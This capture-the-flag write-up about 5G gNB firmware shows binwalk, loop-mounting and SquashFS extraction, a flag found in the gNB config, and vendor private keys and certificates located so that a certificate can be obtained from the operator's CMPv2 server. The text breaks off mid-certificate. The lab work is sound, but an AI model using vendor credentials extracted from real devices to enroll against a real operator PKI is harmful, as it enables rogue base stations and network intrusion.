# 5G Challenge Write-Up
**Date:** April 2025
**Challenge Author(s):**  
**Difficulty:** Moyen - Très difficile


## Investigating the format

The first step is to find quickly relevant information. The tool **binwalk** gives some elements.

```shell
osadmin@ubuntix:~/Developments/Qemu$ binwalk firmware.img 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
21149183      0x142B5FF       MySQL ISAM compressed data file Version 10
26431293      0x1934F3D       Object signature in DER format (PKCS header length: 4, sequence length: 407
29509871      0x1C248EF       MySQL ISAM index file Version 6
32781312      0x1F43400       Microsoft executable, portable (PE)
32802508      0x1F486CC       xz compressed data
40961868      0x271074C       xz compressed data
40973832      0x2713608       Object signature in DER format (PKCS header length: 4, sequence length: 1460
40973973      0x2713695       Certificate in DER format (x509 v3), header length: 4, sequence length: 835
40976384      0x2714000       Microsoft executable, portable (PE)
41095200      0x2731020       ELF, 64-bit LSB relocatable, AMD x86-64, version 1 (SYSV)
41099728      0x27321D0       ELF, 64-bit LSB relocatable, AMD x86-64, version 1 (SYSV)
..
41594248      0x27AAD88       ELF, 64-bit LSB relocatable, AMD x86-64, version 1 (SYSV)
41597775      0x27ABB4F       mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CBC, keymode: 8bit
..
41637472      0x27B5660       ELF, 64-bit LSB relocatable, AMD x86-64, version 1 (SYSV)
63963136      0x3D00000       Linux EXT filesystem, blocks count: 115200, image size: 117964800, rev 1.0, ext4 filesystem data, UUID=55478e9f-c9d0-4eea-b517-2615cd4acd4a
181965980     0xAD8949C       Zlib compressed data, best compression
..
189751902     0xB4F625E       Zlib compressed data, best compression
198179840     0xBCFFC00       Linux EXT filesystem, blocks count: 115200, image size: 117964800, rev 1.0, ext4 filesystem data, UUID=55478e9f-c9d0-4eea-b517-2615cd4acd4a
316164713     0x12D84A69      Zlib compressed data, best compression
..
331598422     0x13C3CA56      Zlib compressed data, best compression
533524668     0x1FCCF0BC      Zlib compressed data, best compression

osadmin@ubuntix:~/Developments/Qemu$
```

Binwalk seems to detect Linux filesystem as well as some compressed data. We may imagine to have an image with integrated filesystem.
We can try to mount the filesytem.
The command **losetup** will scan if partition can be detected and **lsblk** will list the found devices.

Note: **fdisk** command is able to show you available partitions.

```shell
osadmin@ubuntix:~/Developments/Qemu$ sudo losetup -P /dev/loop20 ./firmware.img 
osadmin@ubuntix:~/Developments/Qemu$ lsblk
NAME                  MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINTS
loop0                   7:0    0     4K  1 loop  /snap/bare/5
loop1                   7:1    0  63,8M  1 loop  /snap/core20/2571
loop2                   7:2    0  63,8M  1 loop  /snap/core20/2599
loop3                   7:3    0  73,9M  1 loop  /snap/core22/2010
loop4                   7:4    0  73,9M  1 loop  /snap/core22/2045
loop5                   7:5    0 273,7M  1 loop  /snap/firefox/5437
loop6                   7:6    0 245,3M  1 loop  /snap/firefox/6495
loop7                   7:7    0 349,7M  1 loop  /snap/gnome-3-38-2004/143
loop8                   7:8    0 505,1M  1 loop  /snap/gnome-42-2204/176
loop9                   7:9    0   516M  1 loop  /snap/gnome-42-2204/202
loop10                  7:10   0  91,7M  1 loop  /snap/gtk-common-themes/1535
loop11                  7:11   0  13,2M  1 loop  /snap/icon-theme-breeze/4
loop12                  7:12   0  13,2M  1 loop  /snap/icon-theme-breeze/5
loop13                  7:13   0  18,8M  1 loop  /snap/k9s/155
loop14                  7:14   0  12,2M  1 loop  /snap/snap-store/1216
loop15                  7:15   0  12,3M  1 loop  /snap/snap-store/959
loop16                  7:16   0  50,9M  1 loop  /snap/snapd/24718
loop17                  7:17   0  49,3M  1 loop  /snap/snapd/24792
loop18                  7:18   0   568K  1 loop  /snap/snapd-desktop-integration/253
loop19                  7:19   0   576K  1 loop  /snap/snapd-desktop-integration/315
loop20                  7:20   0   512M  0 loop  
├─loop20p1            259:4    0    60M  0 part  
└─loop20p2            259:5    0   450M  0 part  
nvme0n1               259:0    0 953,9G  0 disk  
├─nvme0n1p1           259:1    0   512M  0 part  /boot/efi
├─nvme0n1p2           259:2    0   1,7G  0 part  /boot
└─nvme0n1p3           259:3    0 951,7G  0 part  
  └─nvme0n1p3_crypt   252:0    0 951,7G  0 crypt 
    ├─vgubuntu-root   252:1    0 929,4G  0 lvm   /var/snap/firefox/common/host-hunspell
    │                                            /
    └─vgubuntu-swap_1 252:2    0   1,9G  0 lvm   [SWAP]
```

Then we can mount partitions:

```shell
osadmin@ubuntix:~/Developments/Qemu$ sudo mount /dev/loop20p1 /mnt
osadmin@ubuntix:~/Developments/Qemu$ ls /mnt

config-6.1.0-35-amd64  EFI  initrd.img  System.map-6.1.0-35-amd64  vmlinuz
osadmin@ubuntix:~/Developments/Qemu$ 
```

The first partition seems to be the partition /boot. We can see that the system is amd64 based and runs EFI. So it could be possible to start the image on Qemu.
Let's see  the second partition.

```shell
osadmin@ubuntix:~/Developments/Qemu$ sudo umount /mnt
osadmin@ubuntix:~/Developments/Qemu$ sudo mount /dev/loop20p2 /mnt
osadmin@ubuntix:~/Developments/Qemu$ ls -l /mnt
total 351800
drwx------ 2 root root     16384 juil. 16 11:41 lost+found
-rw-r--r-- 1 root root 360222720 juil. 16 11:42 rootfs.squashfs
osadmin@ubuntix:~/Developments/Qemu$
```

The image uses a SquashFS filesystem. We can try to extract files and repositories.

```shell
osadmin@ubuntix:~/Developments/Qemu$ unsquashfs /mnt/
lost+found/      rootfs.squashfs  
osadmin@ubuntix:~/Developments/Qemu$ unsquashfs /mnt/rootfs.squashfs 
Parallel unsquashfs: Using 12 processors
15078 inodes (19770 blocks) to write


create_inode: could not create character device squashfs-root/dev/console, because you're not superuser!
...
create_inode: could not create character device squashfs-root/dev/urandom, because you're not superuser!
[======================================================================================================================================================================================================================- ] 19762/19770  99%

created 13754 files
created 2323 directories
created 1313 symlinks
created 0 devices
created 0 fifos
created 0 sockets
osadmin@ubuntix:~/Developments/Qemu$ ls -l
total 502704
-rw-rw-r--  1 osadmin osadmin      5254 juil. 21 10:43 5G_Challenge_Write-Up.md
-rw-rw-r--  1 osadmin osadmin 536870912 juil. 21 10:46 firmware.img
drwxr-xr-x 17 osadmin osadmin      4096 juil. 16 11:40 squashfs-root
osadmin@ubuntix:~/Developments/Qemu$ cd squashfs-root/
osadmin@ubuntix:~/Developments/Qemu/squashfs-root$ ls -l
total 60
lrwxrwxrwx  1 osadmin osadmin    7 juil. 16 11:37 bin -> usr/bin
drwxr-xr-x  2 osadmin osadmin 4096 juil. 16 11:41 boot
drwxr-xr-x  4 osadmin osadmin 4096 juil. 16 11:37 dev
drwxr-xr-x 48 osadmin osadmin 4096 juil. 16 11:41 etc
drwxr-xr-x  3 osadmin osadmin 4096 juil. 16 11:39 home
lrwxrwxrwx  1 osadmin osadmin   30 juil. 16 11:40 initrd.img -> boot/initrd.img-6.1.0-35-amd64
lrwxrwxrwx  1 osadmin osadmin   30 juil. 16 11:40 initrd.img.old -> boot/initrd.img-6.1.0-35-amd64
lrwxrwxrwx  1 osadmin osadmin    7 juil. 16 11:37 lib -> usr/lib
lrwxrwxrwx  1 osadmin osadmin    9 juil. 16 11:37 lib64 -> usr/lib64
drwxr-xr-x  2 osadmin osadmin 4096 juil. 16 11:37 media
drwxr-xr-x  2 osadmin osadmin 4096 juil. 16 11:37 mnt
drwxr-xr-x  2 osadmin osadmin 4096 juil. 16 11:37 opt
drwxr-xr-x  2 osadmin osadmin 4096 mai    9 16:50 proc
drwx------  3 osadmin osadmin 4096 juil. 16 11:39 root
drwxr-xr-x  8 osadmin osadmin 4096 juil. 16 11:39 run
lrwxrwxrwx  1 osadmin osadmin    8 juil. 16 11:37 sbin -> usr/sbin
drwxr-xr-x  2 osadmin osadmin 4096 juil. 16 11:37 srv
drwxr-xr-x  2 osadmin osadmin 4096 mai    9 16:50 sys
drwxrwxrwt  2 osadmin osadmin 4096 juil. 16 11:41 tmp
drwxr-xr-x 12 osadmin osadmin 4096 juil. 16 11:39 usr
drwxr-xr-x 11 osadmin osadmin 4096 juil. 16 11:37 var
lrwxrwxrwx  1 osadmin osadmin   27 juil. 16 11:40 vmlinuz -> boot/vmlinuz-6.1.0-35-amd64
lrwxrwxrwx  1 osadmin osadmin   27 juil. 16 11:40 vmlinuz.old -> boot/vmlinuz-6.1.0-35-amd64
osadmin@ubuntix:~/Developments/Qemu/squashfs-root$ ls -l etc/
total 380
-rw-r--r--  1 osadmin osadmin  3040 mai   25  2023 adduser.conf
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:39 alternatives
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:40 apparmor
drwxr-xr-x  8 osadmin osadmin  4096 juil. 16 11:41 apparmor.d
drwxr-xr-x  8 osadmin osadmin  4096 juil. 16 11:37 apt
-rw-r--r--  1 osadmin osadmin  1994 avril 19 00:47 bash.bashrc
-rw-r--r--  1 osadmin osadmin   367 mars   6 23:46 bindresvport.blacklist
drwxr-xr-x  2 osadmin osadmin  4096 mars   6 15:56 binfmt.d
drwxr-xr-x  3 osadmin osadmin  4096 juil. 16 11:39 ca-certificates
-rw-r--r--  1 osadmin osadmin  5989 juil. 16 11:39 ca-certificates.conf
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:38 cron.d
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:39 cron.daily
-rw-r--r--  1 osadmin osadmin  2969 janv.  8  2023 debconf.conf
-rw-r--r--  1 osadmin osadmin     6 mai    9 16:50 debian_version
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:39 default
-rw-r--r--  1 osadmin osadmin  1706 mai   25  2023 deluser.conf
drwxr-xr-x  4 osadmin osadmin  4096 juil. 16 11:39 dpkg
-rw-r--r--  1 osadmin osadmin   685 mars   5  2023 e2scrub.conf
-rw-r--r--  1 osadmin osadmin     0 juil. 16 11:39 environment
-rw-r--r--  1 osadmin osadmin    37 juil. 16 11:37 fstab
-rw-r--r--  1 osadmin osadmin  2584 juil. 30  2022 gai.conf
-rw-r--r--  1 osadmin osadmin   873 juil. 16 11:41 gnb_config.yml
-rw-r--r--  1 osadmin osadmin   529 juil. 16 11:39 group
-rw-r--r--  1 osadmin osadmin   515 juil. 16 11:39 group-
-rw-r-----  1 osadmin osadmin   443 juil. 16 11:39 gshadow
-rw-r-----  1 osadmin osadmin   432 juil. 16 11:39 gshadow-
drwxr-xr-x  3 osadmin osadmin  4096 juil. 16 11:41 gss
-rw-r--r--  1 osadmin osadmin     9 août   7  2006 host.conf
-rw-r--r--  1 osadmin osadmin    13 juil. 16 11:39 hostname
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:41 init.d
drwxr-xr-x  5 osadmin osadmin  4096 juil. 16 11:39 initramfs-tools
drwxr-xr-x  4 osadmin osadmin  4096 juil. 16 11:41 iproute2
-rw-r--r--  1 osadmin osadmin   608 nov.  13  2023 ipsec.conf
drwxr-xr-x 11 osadmin osadmin  4096 juil. 16 11:41 ipsec.d
-rw-------  1 osadmin osadmin   175 nov.  13  2023 ipsec.secrets
-rw-r--r--  1 osadmin osadmin    27 mai    9 16:50 issue
-rw-r--r--  1 osadmin osadmin    20 mai    9 16:50 issue.net
drwxr-xr-x  5 osadmin osadmin  4096 juil. 16 11:39 kernel
-rw-r--r--  1 osadmin osadmin  7271 juil. 16 11:41 ld.so.cache
-rw-r--r--  1 osadmin osadmin    34 mars   6 23:46 ld.so.conf
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:38 ld.so.conf.d
-rw-r--r--  1 osadmin osadmin   191 févr.  9  2023 libaudit.conf
lrwxrwxrwx  1 osadmin osadmin    27 juil. 16 11:38 localtime -> /usr/share/zoneinfo/Etc/UTC
drwxr-xr-x  6 osadmin osadmin  4096 juil. 16 11:41 logcheck
-rw-r--r--  1 osadmin osadmin 12569 avril  7 12:38 login.defs
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:39 logrotate.d
-r--r--r--  1 osadmin osadmin    33 juil. 16 11:39 machine-id
-rw-r--r--  1 osadmin osadmin   782 mars   5  2023 mke2fs.conf
drwxr-xr-x  2 osadmin osadmin  4096 déc.  10  2022 modprobe.d
-rw-r--r--  1 osadmin osadmin   248 juil. 16 11:39 modules
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:39 modules-load.d
-rw-r--r--  1 osadmin osadmin   286 mai    9 16:50 motd
lrwxrwxrwx  1 osadmin osadmin    19 juil. 16 11:39 mtab -> ../proc/self/mounts
-rw-r--r--  1 osadmin osadmin   767 août  11  2022 netconfig
-rw-r--r--  1 osadmin osadmin   494 mars   6 23:46 nsswitch.conf
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:37 opt
lrwxrwxrwx  1 osadmin osadmin    21 mai    9 16:50 os-release -> ../usr/lib/os-release
-rw-r--r--  1 osadmin osadmin   552 sept. 21  2023 pam.conf
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:41 pam.d
-rw-r--r--  1 osadmin osadmin  1009 juil. 16 11:41 passwd
-rw-r--r--  1 osadmin osadmin   947 juil. 16 11:39 passwd-
drwxr-xr-x  3 osadmin osadmin  4096 avril 12 17:16 perl
-rw-r--r--  1 osadmin osadmin   769 avril 10  2021 profile
drwxr-xr-x  2 osadmin osadmin  4096 mai    9 16:50 profile.d
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:41 rc0.d
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:41 rc1.d
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:41 rc2.d
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:41 rc3.d
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:41 rc4.d
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:41 rc5.d
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:41 rc6.d
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:40 rcS.d
-rw-r--r--  1 osadmin osadmin   932 juil. 16 11:37 resolv.conf
lrwxrwxrwx  1 osadmin osadmin    13 janv. 20  2024 rmt -> /usr/sbin/rmt
drwxr-xr-x  4 osadmin osadmin  4096 juil. 16 11:41 security
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:38 selinux
-rw-r-----  1 osadmin osadmin   556 juil. 16 11:41 shadow
-rw-r-----  1 osadmin osadmin   531 juil. 16 11:39 shadow-
-rw-r--r--  1 osadmin osadmin   128 juil. 16 11:38 shells
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:38 skel
drwxr-xr-x  4 osadmin osadmin  4096 juil. 16 11:39 ssl
-rw-r--r--  1 osadmin osadmin   281 nov.  13  2023 strongswan.conf
drwxr-xr-x  3 osadmin osadmin  4096 juil. 16 11:41 strongswan.d
-rw-r--r--  1 osadmin osadmin    19 juil. 16 11:39 subgid
-rw-r--r--  1 osadmin osadmin     0 juil. 16 11:39 subgid-
-rw-r--r--  1 osadmin osadmin    19 juil. 16 11:39 subuid
-rw-r--r--  1 osadmin osadmin     0 juil. 16 11:39 subuid-
drwxr-xr-x 16 osadmin osadmin  4096 juil. 16 11:41 swanctl
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:39 sysctl.d
drwxr-xr-x  5 osadmin osadmin  4096 juil. 16 11:39 systemd
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:38 terminfo
-rw-r--r--  1 osadmin osadmin     8 juil. 16 11:38 timezone
drwxr-xr-x  2 osadmin osadmin  4096 mars   6 15:56 tmpfiles.d
drwxr-xr-x  4 osadmin osadmin  4096 juil. 16 11:39 udev
drwxr-xr-x  2 osadmin osadmin  4096 juil. 16 11:38 update-motd.d
-rw-r--r--  1 osadmin osadmin   681 janv. 17  2023 xattr.conf
drwxr-xr-x  3 osadmin osadmin  4096 juil. 16 11:39 xdg
osadmin@ubuntix:~/Developments/Qemu/squashfs-root$ 
```

From 5G perspectives, we note some interesting files:

- gnb_config.yml
- swanctl (Strongswan / IPSec) repository
- ssl repository with provisionned files

```shell
osadmin@ubuntix:~/Developments/Qemu/squashfs-root$ cat etc/gnb_config.yml
# GNB configuration file
# Flag (Replace the first '!' by 'i' ;o): h!t{S0-intere$ting-config-f!le}

#cmpv2:
  # url: http://<CMPV2_IP>/ejbca/publicweb/cmp/3GPP
  # url: http://10.194.124.35/ejbca/publicweb/cmp/3GPP

cu_cp:
  amf:
    addr: 10.1.0.5
    port: 38412
    bind_addr: <TO BE CONFIGURED>
    supported_tracking_areas:
      - tac: 1
        plmn_list:
          - plmn: "00101"
            tai_slice_support_list:
              - sst: 1
                sd: 1

ru_sdr:
  device_driver: uhd
  device_args: type=n3xx
  clock: gpsdo
  sync: gpsdo
  srate: 30.72
  tx_gain: 35
  rx_gain: 60

cell_cfg:
  dl_arfcn: 368640
  band: 3
  channel_bandwidth_MHz: 20
  common_scs: 15
  plmn: "00101"
  tac: 7
  pci: 1

log:
  filename: /tmp/gnb.log
  all_level: info

pcap:
  mac_enable: false
  mac_filename: /tmp/gnb_mac.pcap
  ngap_enable: false
  ngap_filename: /tmp/gnb_ngap.pcap
```

**FIRST FLAG**: hit{S0-intere$ting-config-f!le}

The config file contains information about CMPv2 server. Is it available?

```shell
osadmin@ubuntix:~/Developments/Qemu/squashfs-root$ curl http://10.194.124.35:8080/ejbca/publicweb/cmp/3GPP
<html><head><title>Error</title></head><body>You can only use POST!</body></html>
osadmin@ubuntix:~/Developments/Qemu/squashfs-root$
```

Yes, it is running!
The objective is now to get a certificate from the CMPv2 server.

The first step is to generate our own private key.

```shell
osadmin@ubuntix:~/Developments/Qemu$ openssl ecparam -name secp384r1 -genkey -noout -out PwnedTelecom-gnb.key
```

Then, we need all files for registered our certificate to the PKI, i.e Vendor X.509 certificate, private key and Root CA certificate. These information is available in the filesystem.

```shell
osadmin@ubuntix:~/Developments/Qemu/squashfs-root$ ls -l etc/ssl/private/
total 4
-rw------- 1 osadmin osadmin 3243 juil. 16 11:41 MyGNB_Vendor_gnb.key
osadmin@ubuntix:~/Developments/Qemu/squashfs-root$ ls -l etc/ssl/certs/ | grep Vendor
-rw-r--r-- 1 osadmin osadmin   7604 juil. 16 11:41 MyGNB_Vendor_gnb.crt
-rw-r--r-- 1 osadmin osadmin   2118 juil. 16 11:41 MyGNB_Vendor_rootca.crt
```

```shell
osadmin@ubuntix:~/Developments/Qemu/squashfs-root$ openssl x509 -noout -text -in etc/ssl/certs/MyGNB_Vendor_gnb.crt
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 1 (0x1)
        Signature Algorithm: sha384WithRSAEncryption
        Issuer: C = FR, O = MyGNB Vendor, OU = FOR CTF USE ONLY, CN = MyGNB Vendor Root CA
        Validity
            Not Before: May 27 13:57:32 2025 GMT
            Not After : May 25 13:57:32 2035 GMT
        Subject: C = FR, O = MyGNB Vendor, CN = GNB0002164987.mygnb-vendor.org
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (4096 bit)
                Modulus:
                    00:d4:17:fc:d8:95:88:ad:e2:53:ed:a6:fd:e2:51:
                    4f:82:ad:90:94:03:5e:25:2d:38:0e:ab:0f:0a:f0:
                    93:be:ed:a7:e5:d1:d1:02:16:17:30:9d:b0:18:ba:
                    4d:e1:51:e6:4d:96:a2:85:56:5f:9f:85:5f:66:c6:
                    61:11:46:f4:19:8a:d9:24:a5:d4:43:a7:7f:54:40:
                    f0:20:73:60:74:af:e2:6a:59:73:07:43:fe:ec:e5:
                    08:ab:b1:70:8b:92:2f:47:b3:7e:ca:06:55:8e:b8:
                    4e:9f:ee:5c:77:00:e2:f7:5a:b2:b2:ad:09:9e:e7:
                    ec:e6:2b:be:3e:8f:b4:df:75:7d:fa:32:c1:75:21:
                    58:a6:d2:95:50:e4:30:53:56:2b:4f:b5:0f:23:91:
                    f1:b8:16:6c:a9:cb:69:e8:15:cf:f5:b6:3f:58:70:
                    bf:c9:c1:1e:6c:71:09:68:e8:2b:2c:ac:9a:bd:ea:
                    f2:19:b7:79:a2:53:0f:db:6e:ee:cc:9f:c1:83:eb:
                    1b:7d:a8:07:e1:10:bf:e2:67:8d:78:41:fa:0b:ad:
                    eb:fc:fc:59:21:0a:b3:34:b6:25:40:1b:db:c6:2f:
                    35:c7:a5:43:38:28:81:ee:bf:9a:fc:e5:ef:d5:f5:
                    eb:b9:ea:e8:1e:17:f6:1e:60:eb:ab:53:c6:9d:92:
                    df:41:9e:15:06:85:c7:03:ad:99:75:28:dc:57:30:
                    61:2b:55:c2:cb:8a:29:72:8f:10:fa:8c:aa:32:d8:
                    57:25:5f:d0:0a:75:a4:cf:06:0b:ee:a3:62:f0:19:
                    fb:ea:aa:4e:c8:54:e2:ca:f1:3f:1c:6c:7d:71:ea:
                    91:0e:ed:6f:07:21:b3:e1:28:15:f6:fb:96:52:a8:
                    e7:9f:ca:68:f8:7e:37:c0:5e:80:9d:df:a0:1f:9b:
                    5f:92:73:7d:ca:0a:cf:99:fd:a5:8a:25:31:60:e1:
                    b2:22:a1:86:bf:7a:36:39:3e:66:29:23:8b:3f:16:
                    5a:db:13:d9:25:9a:44:b2:98:c7:72:e3:06:c2:66:
                    6d:2a:14:f4:14:e6:8a:a4:93:32:6f:f7:ce:9b:f1:
                    70:5b:ab:86:5b:69:18:e3:fd:5d:97:59:56:88:99:
                    85:6d:c6:a1:c3:64:b9:75:39:64:6f:bf:59:ca:2b:
                    f1:23:29:33:24:c5:05:9c:d6:db:32:d8:88:bf:78:
                    56:13:56:b4:ad:1a:70:f1:7a:8e:51:f3:78:1d:95:
                    14:5f:6a:a6:6c:74:e7:5d:e0:59:77:cd:e6:a9:b0:
                    8c:6f:a0:90:79:24:1d:72:2f:74:3c:56:a5:79:25:
                    8c:6d:5e:32:23:8c:c2:38:87:6c:71:63:c1:9a:18:
                    db:2c:b7
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                95:4E:3E:6D:CF:05:6E:24:4A:18:CC:E8:8C:3E:2B:C0:EC:1E:27:33
            X509v3 Authority Key Identifier: 
                5D:95:95:33:86:6F:A7:62:5A:8D:98:35:B6:3F:68:B7:3B:53:6E:81
            X509v3 CRL Distribution Points: 
                Full Name:
                  URI:http://pki.mygnb-vendor.org/crl/rootca.crl
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            X509v3 Extended Key Usage: 
                TLS Web Client Authentication, TLS Web Server Authentication
            X509v3 Subject Alternative Name: 
                DNS:GNB0002164987.mygnb-vendor.org
    Signature Algorithm: sha384WithRSAEncryption
    Signature Value:
        9e:14:cd:ee:e8:b0:b7:a0:6c:b2:25:4d:19:ee:9d:4a:5c:2f:
        15:68:6d:e9:1b:3c:0d:df:56:e5:db:6d:bd:9d:8b:bb:e7:95:
        0e:71:e5:88:e2:8b:44:81:5c:88:88:5c:85:d6:93:f6:8b:e0:
        01:a9:9a:2a:4f:ea:33:e4:6b:84:db:f3:52:ae:30:3c:6b:fa:
        d1:6f:4a:e3:fd:73:b4:db:32:3f:23:bf:b0:f9:8b:06:44:6d:
        52:0a:10:4b:c3:2a:f2:94:e8:c9:0a:98:59:09:26:e0:3f:6d:
        4e:02:a2:2d:91:4e:fb:3f:af:e4:9e:ae:f4:3a:c4:e4:4b:67:
        27:da:c3:ad:36:a1:0b:c4:9a:c3:1a:9a:6a:e3:f1:f5:8a:74:
        cc:ea:83:a0:92:c2:ec:44:3e:f3:58:8f:0d:fb:9b:54:a0:c5:
        bc:86:fb:aa:7b:9e:26:8a:fb:08:d7:84:6b:41:c6:66:7b:25:
        07:b9:2c:19:ac:03:7f:e5:63:72:49:e6:fc:de:69:c6:5d:61:
        d5:5f:c9:01:1b:9a:f7:e4:b9:28:27:4a:40:29:80:84:c6:04:
        b3:bb:50:4f:e9:1f:46:12:ed:35:33:60:da:b8:97:ec:aa:c0:
        10:90:80:a1:06:e2:16:24:33:91:63:09:f6:79:10:09:3a:fa:
        17:77:21:f7:ba:a7:c2:f9:90:69:b8:f0:15:ff:17:f2:71:f6:
        d5:7d:b6:cd:8f:5a:9d:31:5d:a3:69:fe:41:ae:1c:2e:5c:23:
        be:ba:fc:fb:15:e5:77:90:db:af:cb:11:0c:c5:07:04:e1:aa:
        ab:46:6a:cd:36:4f:d9:ac:14:67:25:14:d4:fa:7c:97:76:0b:
        95:a0:4f:df:02:2d:0f:3f:c8:c1:29:52:5f:ec:ed:c6:be:ca:
        72:60:f9:8f:da:28:02:e2:22:c5:b1:fd:d3:bb:8e:c0:7a:3b:
        b7:87:2a:d4:e5:fa:0d:f8:d1:9b:0c:2e:b7:b4:ed:be:bf:f0:
        d1:d0:f3:83:d2:73:51:e9:f7:ff:81:aa:7e:ff:37:5b:bb:66:
        02:e6:78:05:5d:0e:5c:5b:7a:b9:6d:1d:ec:bc:49:bf:60:18:
        63:25:40:1f:51:1b:78:9c:c3:5a:83:ae:86:9c:0c:e2:90:23:
        8c:49:81:b8:e2:fc:ab:15:92:79:84:75:59:34:f5:7c:2e:4d:
        f0:c2:9c:d7:87:dd:37:f9:f2:0a:3c:57:d5:8d:6f:73:cc:fa:
        09:d2:89:3a:74:e2:93:18:da:ce:2d:2d:d0:a0:8f:e2:e1:52:
        f2:9a:72:8a:70:72:b5:6d:b6:63:55:48:48:21:da:dd:f5:7c:
        62:64:79:ea:3b:82:5b:4f
```

The challenge provides the firmware but also a Root CA certificate of the PwnedTelecom operator.

```shell
osadmin@ubuntix:~/Developments/Qemu/squashfs-root$ cat PwnedTelecomCA.cacert.pem 
-----BEGIN CERTIFICATE-----
MIIFeTCCA2GgAwIBAgIUHU/aQRouGgF93358WlM/R/6ofT8wDQYJKoZIhvcNAQEL
BQAwRDELMAkGA1UEBhMCRlIxFjAUBgNVBAoMDVB3bmVkIFRlbGVjb20xHTAbBgNV
BAMMFFB3bmVkIFRlbGVjb20gUm9vdENBMB4XDTI1MDUxMzEwMTEwNVoXDTQ1MDUw
ODEwMTEwNFowRDELMAkGA1UEBhMCRlIxFjAUBgNVBAoMDVB3bmVkIFRlbGVjb20x
HTAbBgNVBAMMFFB3bmVkIFRlbGVjb20gUm9vdENBMIICIjANBgkqhkiG9w0BAQEF
AAOCAg8AMIICCgKCAgEA2yLzaJi9kC9Oo2psvOj6QkgSW02LvTU28tJFG8XpBHzH
GhSxsk/uWnSrlw462QQtxQJSxsfr2kddmc4AIu8X8AAFx2fTf9o3L9q5+1GCw+xV
g5kDSSrzsnxF5O13X7dV1vu17HxPx7cn+Y667hsWD0Enit4U3LC4S72e3LzNkbU9
BX+TEGai5srhevNb2HSPvK6vwh35cL6ZHXJJLPPjLfc1a5xz5LX1Xc4ug5kK0fc4
YxQQ2VDblR5tANlWC7QM/XVUDSECJIK0fwX+J5kISDv5zTbWVqKEPeRLZlYj3O5G
LH2VlfGZmujvjqRoR8XcFQ67wvWqkuGU9JFVoI0bx1Exk8H4/nIcGqsH2CqBvwII
PqT4XTsBW5LQTTJfMXjuXCe87d5OhfRZK3eowM3gmQwVCG+bKtsell8Nwm1oc1Fb
nyPsQ96r6KHpuIXjbPKmSM15phffaGBmO2O3FZUNAzh0BEHKvxWfWG/DsRFbJgX1
aePyPxrc1SxER/+xoAWnuV7Ho88GAvdD+sh25JvJ3YBM1Fo0X8oX0fqfFyQOd2k2
VAqicobuV2CJd4ba8RY3Y64ayBfRQKAw2u5MinZVs775+AjHctqc0X4VEUtEt4J9
V70uonVimJG+wBcmJvSpuwyOIk1LDAg0uO8M5BoFm+ObVMEjVDYiPxuAjtLoT50C
AwEAAaNjMGEwDwYDVR0TAQH/BAUwAwEB/zAfBgNVHSMEGDAWgBQ1azs1C7OYh11e
nbJ50YOfbLdSBzAdBgNVHQ4EFgQUNWs7NQuzmIddXp2yedGDn2y3UgcwDgYDVR0P
AQH/BAQDAgGGMA0GCSqGSIb3DQEBCwUAA4ICAQAb4o4KyClQDhKUjJggcqkNKd/t
sRKbB/zFBuOtfopBQez3tU4W04tXYBURQPEuazHyLqM7BQFDXmB2izDNNZ3gldMK
M9UAe+CSuv+uJxWhbJV6+5m1Dj7RF93jFNOOvLXPY9h5kQDfGMNfKM3TpNJg1lSu
3VY5zwAuDgj3TrU7wHCSxt2Y891LEQo0G3l/cWKGjSx2huFOFUD1dJl6U2QN8nN3
Ad5j7ppA9GXH2dDdxAuarDeiPTeojuEYgn1b2QE+ILgQuAYq7ADWHiOwustVaDvf
Vn7MVxk7tjo/Loof07orvjCFwGbMThUC6uV6xBJz+DdTELcJT7brjbkIh2igRTzC
GDIL+QgiHwR2F4Cgr1XlDda0SMxe+VRWr6kGLSn8HqPm9cqpIvs89njw3OfLgIRm
PA40MGvEKTPDeNnHoF/+o2YH833L1TtLBXi6r1xR9qO++xoIk5q7HX28sJC353HC
EgA/HBkZz8y6dxn4GQAnmGAAoQdQF6cE1QqlsQv8AoZnS/1PqNYUyqWAiDQFWMUs
kz6umIymtDIUv987krBImGfE3NdSif9KEJUG7G+L1hy3SqqDsRrFKEig3YhDY2f4
F5j/F1VaMJT2TIyEZdUeBp3TNRGU5CSLos312UMUynMR/VleUE2AaoLOMhSWKi4r
VQxITWC2wUc+U+Blfg==
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
MIIFuDCCA6CgAwIBAgIUIEWrOCeShaZsPuzu8CmV895OTgYwDQYJKoZIhvcNAQEL
BQAwRDELMAkGA1UEBhMCRlIxFjAUBgNVBAoMDVB3bmVkIFRlbGVjb20xHTAbBgNV
BAMMFFB3bmVkIFRlbGVjb20gUm9vdENBMB4XDTI1MDUxMzEwMTQyNVoXDTM1MDUx
MTEwMTQyNFowQzELMAkGA1UEBhMCRlIxFjAUBgNVBAoMDVB3bmVkIFRlbGVjb20x
